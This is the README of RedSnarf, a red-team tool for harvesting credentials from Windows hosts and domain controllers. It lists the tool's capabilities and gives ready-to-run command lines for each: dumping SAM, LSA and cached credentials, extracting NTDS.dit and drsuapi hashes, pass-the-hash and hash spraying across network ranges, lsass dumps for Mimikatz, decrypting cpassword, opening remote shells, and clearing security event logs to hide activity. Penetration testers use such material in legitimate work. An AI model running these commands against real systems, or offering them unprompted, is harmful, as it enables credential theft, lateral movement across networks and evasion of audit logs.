     ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/         

RedSnarf is a pen-testing / red-teaming tool by Ed William and Richard Davy for retrieving hashes and credentials from Windows workstations, servers and domain controllers using OpSec Safe Techniques.

RedSnarf functionality includes: 

•	Retrieval of local SAM hashes;
•	Enumeration of user/s running with elevated system privileges and their corresponding lsa secrets password;
•	Retrieval of MS cached credentials;
•	Pass-the-hash;
•	Quickly identify weak and guessable username/password combinations (default of administrator/Password01);
•	The ability to retrieve hashes across a range;
•	Hash spraying - 
o	Credsfile will accept a mix of pwdump, fgdump and plain text username and password separated by a space;
•	Lsass dump for offline analysis with Mimikatz;
•	Dumping of Domain controller hashes using NTDSUtil and retrieval of NTDS.dit for local parsing;
•	Dumping of Domain controller hashes using the drsuapi method;
•	Retrieval of Scripts and Policies folder from a Domain controller and parsing for 'password' and 'administrator';
•	Ability to decrypt cpassword hashes;
•	Ability to start a shell on a remote machine;
•	The ability to clear the event logs (application, security, setup or system);
•	Results are saved on a per-host basis for analysis.

RedSnarf Usage
=======================

Requirements:
Impacket v0.9.16-dev - https://github.com/CoreSecurity/impacket.git
CredRetrieve 7 - https://github.com/Neohapsis/credRetrieve7
Lsass Retrieval using procdump - https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
Netaddr (0.7.12) - easy_install install netaddr
Termcolor (1.1.0) - easy_install termcolor
dos2unix - used with parsing Mimikatz info locally 

Show Help
./redsnarf.py -h
./redsnarf.py --help

Retrieve Local Hashes
=======================

Retrieve Local Hashes from a single machine using weak local credetials and clearing the Security event log
./redsnarf.py -H 10.0.0.50 -s security

Retrieve Local Hashes from a single machine using weak local credetials and clearing the application event log
./redsnarf.py -H 10.0.0.50 -s application

Retrieve Local Hashes from a single machine using local administrator credentials
./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D .

Retrieve Local Hashes from a single machine using domain administrator credentials
./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D yourdomain.com

Retrieve Hashes across a network range using local administrator credentials
./redsnarf.py -H 10.0.0.1/24 -u administrator -p Password01 -D .

Retrieve Hashes across a network range using domain administrator credentials
./redsnarf.py -H 10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com


Hash Spraying
=======================

Spray Hashes across a network range 
./redsnarf.py -H 10.0.0.1/24 -C credsfile -D .

Retrieve Hashes across a network range domain login
./redsnarf.py -H 10.0.0.1/24 -C credsfile -D yourdomain.com


Retrieve Domain Hashes
=======================

Retrieve Hashes using drsuapi method (Quickest)
./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -i y

Retrieve Hashes using NTDSUtil
./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -n y


Information Gathering
=======================

Copy the Policies and Scripts folder from a Domain Controller and parse for password and administrator
./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -P y

Decrypt Cpassword
./redsnarf.py -g cpassword


Misc
=======================

Start a Shell on a machine using local administrator credentials
./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D . -d y

Start a Shell on a machine using domain administrator credentials
./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D yourdomain.com -d y

Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D . -l y

Additional Information
=======================

For more information please visit:
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/november/introducing-redsnarf-and-the-importance-of-being-careful/ 
